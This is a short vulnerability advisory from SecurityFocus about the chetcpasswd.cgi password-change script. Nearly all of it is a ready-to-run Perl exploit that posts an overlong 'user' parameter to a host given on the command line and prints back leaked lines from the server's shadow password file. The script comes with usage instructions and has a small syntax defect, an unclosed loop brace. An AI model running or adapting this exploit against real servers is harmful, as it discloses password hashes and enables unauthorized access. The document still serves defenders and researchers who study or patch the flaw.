source: http://www.securityfocus.com/bid/6472/info

CHETCPASSWD is prone to a vulnerability that may potentially cause the tail end of the local shadow file to be disclosed to a remote attacker.

It is possible to exploit this issue by sending an overly long string as a value for the 'user' URI parameter in a request to the 'chetcpasswd.cgi'.

#!/usr/bin/perl -w
#Exploit coded by Victor Pereira <vpereira@modulo.com.br>
#Thanks to Alexandre Vargas And Thiago Zaninotti
use strict;
use Socket;
my ($remote,$port, $iaddr, $paddr,
$proto,$linha,$query,$len_query,$ARGC,$fakeuser,$linhas,$pattern);

$ARGC=@ARGV;
if($ARGC < 1){
        print "chetcpasswd.cgi exploit\n";
 print "coded by VP <vpereira\@modulo.com.br>\n";
        print "Usage:$0 <host>\n";
        exit;
}
$fakeuser="ASSHOLEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
EEEEEEEEEEEEEEEEE";
$pattern="User: E*E";

$query="user=$fakeuser&old_pw=teste&new_pw1=teste1&new_pw2=teste1&change='Altere minha senha'";

$len_query=length($query);
$remote = $ARGV[0];
$port = 80; # random port
if ($port =~ /\D/) { $port = getservbyname($port, 'tcp') }
die "No port" unless $port;
$iaddr = inet_aton($remote) || die "no host: $remote";
$paddr = sockaddr_in($port, $iaddr);

$proto = getprotobyname('tcp');
socket(SOCK, PF_INET, SOCK_STREAM, $proto) || die "socket: $!";
connect(SOCK, $paddr) || die "connect: $!";
select(SOCK); $|=1; select(STDOUT);
print SOCK "POST /cgi-bin/chetcpasswd.cgi HTTP/1.0\n";
print SOCK "Connection: Keep-Alive\n";
print SOCK "Content-type: application/x-www-form-urlencoded\n";
print SOCK "Content-length: $len_query\n";
print SOCK "\n$query\r\n\r\n";

$linha = "";
while (<SOCK>) {

    $linha = $_;
    if($linha =~ s/<.*?>//g){
         $linha =~ s/$pattern//g;
         print $linha;
}
close (SOCK) || die "close: $!";
exit;